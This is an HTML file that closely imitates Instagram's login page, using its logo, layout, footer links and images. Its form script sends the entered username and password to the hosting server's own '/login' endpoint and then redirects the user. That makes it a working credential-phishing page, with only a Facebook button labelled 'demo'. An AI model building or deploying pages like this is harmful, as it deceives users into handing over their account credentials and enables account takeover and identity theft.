<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yt/r/30PrGfR3xhB.png">
    <link href="https://fonts.googleapis.com/css2?family=Lobster&display=swap" rel="stylesheet">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .main-container {
            display: flex;
            align-items: center;
            justify-content: center;
            max-width: 935px;
            width: 100%;
            margin: 0 auto;
            padding: 20px;
        }

        .phone-mockup {
            margin-right: 32px;
            flex-shrink: 0;
            position: relative;
            width: 450px;
            height: 580px;
        }

        .phone-mockup img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .form-container {
            max-width: 350px;
            width: 100%;
        }

        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 40px 40px 20px;
            margin-bottom: 10px;
        }

        .instagram-logo {
            font-family: 'Lobster', 'Billabong', 'Brush Script MT', cursive;
            font-size: 51px;
            text-align: center;
            margin: 36px auto 12px;
            color: #000;
            font-weight: 400;
            letter-spacing: 0.5px;
        }

        .form-group {
            margin-bottom: 6px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 9px 0 7px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            line-height: 16px;
            outline: none;
            transition: border-color 0.2s ease;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #a8a8a8;
            background: #fff;
        }

        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: #8e8e8e;
        }

        .login-button {
            width: 100%;
            background-color: #0095f6;
            border: none;
            border-radius: 8px;
            color: #fff;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            padding: 7px 16px;
            margin: 8px 0;
            transition: background-color 0.2s;
        }

        .login-button:hover {
            background-color: #1877f2;
        }

        .login-button:disabled {
            opacity: 0.3;
            cursor: default;
        }

        .divider-container {
            display: flex;
            align-items: center;
            margin: 10px 0 18px;
        }

        .divider-line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider-text {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
            text-transform: uppercase;
        }

        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 8px 0 14px;
            cursor: pointer;
        }

        .fb-icon {
            width: 16px;
            height: 16px;
            margin-right: 8px;
            background: url('data:image/svg+xml;charset=utf-8,%3Csvg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="%23385185"%3E%3Cpath d="M14 0H2C.897 0 0 .897 0 2v12c0 1.103.897 2 2 2h6v-6H6V8h2V6c0-1.654 1.346-3 3-3h2v2h-2c-.551 0-1 .449-1 1v2h3l-.5 2H10v6h4c1.103 0 2-.897 2-2V2c0-1.103-.897-2-2-2z"/%3E%3C/svg%3E') no-repeat center;
        }

        .fb-login-text {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
        }

        .forgot-password {
            text-align: center;
            font-size: 12px;
            margin: 12px 0;
        }

        .forgot-password a {
            color: #00376b;
            text-decoration: none;
        }

        .error-message {
            display: none;
            color: #ed4956;
            font-size: 14px;
            text-align: center;
            margin: 10px 40px;
        }

        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            margin-bottom: 10px;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .get-app {
            text-align: center;
            margin: 20px 0;
        }

        .get-app-text {
            font-size: 14px;
            margin-bottom: 16px;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .app-buttons img {
            height: 40px;
            cursor: pointer;
        }

        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #fafafa;
            padding: 24px 0;
            width: 100%;
        }

        .footer-content {
            max-width: 935px;
            margin: 0 auto;
            padding: 0 20px;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 12px 16px;
            margin-bottom: 16px;
        }

        .footer-links a {
            color: #737373;
            font-size: 12px;
            text-decoration: none;
            line-height: 14px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .footer-bottom {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 16px;
        }

        .language-selector {
            display: flex;
            align-items: center;
            color: #737373;
            font-size: 12px;
            cursor: pointer;
        }

        .language-selector select {
            background: transparent;
            border: none;
            color: #737373;
            font-size: 12px;
            cursor: pointer;
            outline: none;
            padding: 0;
        }

        .footer-copyright {
            color: #737373;
            font-size: 12px;
        }

        /* Loading overlay */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.8);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }

        .loading-overlay.active {
            display: flex;
        }

        .spinner {
            width: 24px;
            height: 24px;
            border: 2px solid #dbdbdb;
            border-top: 2px solid #000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
            20%, 40%, 60%, 80% { transform: translateX(5px); }
        }

        .shake {
            animation: shake 0.5s;
        }

        @media (max-width: 875px) {
            .phone-mockup {
                display: none;
            }

            .main-container {
                margin-top: 0;
            }
        }

        @media (max-width: 450px) {
            body {
                background-color: #fff;
            }
            
            .login-box {
                border: none;
                padding: 0 20px;
            }
            
            .signup-box {
                border: none;
            }

            .footer {
                position: static;
                margin-top: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Loading overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
    </div>

    <div class="main-container">
        <!-- Phone mockup with image collage - only visible on desktop -->
        <div class="phone-mockup">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png" alt="Instagram">
        </div>

        <!-- Login form -->
        <div class="form-container">
            <div class="login-box">
                <div class="instagram-logo">Instagram</div>
                
                <form id="loginForm">
                    <div class="error-message" id="errorMessage"></div>
                    
                    <div class="form-group">
                        <input type="text" name="username" id="username" placeholder="Phone number, username, or email" required autocomplete="username" aria-label="Phone number, username, or email">
                    </div>
                    
                    <div class="form-group">
                        <input type="password" name="password" id="password" placeholder="Password" required autocomplete="current-password" aria-label="Password">
                    </div>
                    
                    <button type="submit" class="login-button" id="loginButton">Log in</button>
                </form>
                
                <div class="divider-container">
                    <div class="divider-line"></div>
                    <div class="divider-text">or</div>
                    <div class="divider-line"></div>
                </div>
                
                <div class="fb-login">
                    <span class="fb-icon"></span>
                    <span class="fb-login-text">Log in with Facebook</span>
                </div>
                
                <div class="forgot-password">
                    <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgot password?</a>
                </div>
            </div>
            
            <div class="signup-box">
                Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">Sign up</a>
            </div>
            
            <div class="get-app">
                <p class="get-app-text">Get the app.</p>
                <div class="app-buttons">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft">
                </div>
            </div>
        </div>
    </div>

    <footer class="footer">
        <div class="footer-content">
            <div class="footer-links">
                <a href="https://about.meta.com/" target="_blank">Meta</a>
                <a href="https://about.instagram.com/" target="_blank">About</a>
                <a href="https://about.instagram.com/blog" target="_blank">Blog</a>
                <a href="https://about.instagram.com/about-us/careers" target="_blank">Jobs</a>
                <a href="https://help.instagram.com/" target="_blank">Help</a>
                <a href="https://developers.facebook.com/docs/instagram" target="_blank">API</a>
                <a href="https://privacycenter.instagram.com/policy" target="_blank">Privacy</a>
                <a href="https://help.instagram.com/581066165581870" target="_blank">Terms</a>
                <a href="https://www.instagram.com/explore/locations/" target="_blank">Locations</a>
                <a href="https://www.instagram.com/web/lite/" target="_blank">Instagram Lite</a>
                <a href="https://www.threads.net/" target="_blank">Threads</a>
                <a href="https://www.facebook.com/help/instagram/261704639352628" target="_blank">Contact Uploading & Non-Users</a>
                <a href="https://about.meta.com/technologies/meta-verified/" target="_blank">Meta Verified</a>
            </div>
            <div class="footer-bottom">
                <div class="language-selector">
                    <select>
                        <option value="en">English</option>
                        <option value="es">Español</option>
                        <option value="fr">Français</option>
                        <option value="de">Deutsch</option>
                        <option value="it">Italiano</option>
                        <option value="pt">Português (Brasil)</option>
                        <option value="ja">日本語</option>
                        <option value="ko">한국어</option>
                        <option value="zh-cn">中文(简体)</option>
                    </select>
                </div>
                <span class="footer-copyright">© 2025 Instagram from Meta</span>
            </div>
        </div>
    </footer>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const form = this;
            const button = document.getElementById('loginButton');
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            const errorDiv = document.getElementById('errorMessage');
            
            // Clear previous errors
            errorDiv.style.display = 'none';
            errorDiv.textContent = '';
            
            // Show loading state
            button.textContent = 'Logging in...';
            button.disabled = true;
            document.getElementById('loadingOverlay').classList.add('active');
            
            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: new URLSearchParams({
                        username: username,
                        password: password
                    })
                });
                
                const data = await response.json();
                
                // Check if response is successful (status 200)
                if (response.ok && data.status === 'success') {
                    // Redirect to Instagram
                    window.location.href = data.redirect;
                } else {
                    // Show error message for wrong password or other errors
                    document.getElementById('loadingOverlay').classList.remove('active');
                    errorDiv.textContent = data.message || 'Sorry, your password was incorrect. Please double-check your password.';
                    errorDiv.style.display = 'block';
                    button.textContent = 'Log in';
                    button.disabled = false;
                    
                    // Shake animation
                    form.classList.add('shake');
                    setTimeout(() => form.classList.remove('shake'), 500);
                    
                    // Focus password field
                    document.getElementById('password').focus();
                    document.getElementById('password').select();
                }
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('loadingOverlay').classList.remove('active');
                errorDiv.textContent = 'Sorry, there was a problem. Please try again.';
                errorDiv.style.display = 'block';
                button.textContent = 'Log in';
                button.disabled = false;
            }
        });

        // Facebook login (just for show)
        document.querySelector('.fb-login').addEventListener('click', function() {
            alert('This feature is not available in this demo.');
        });
    </script>
</body>
</html>
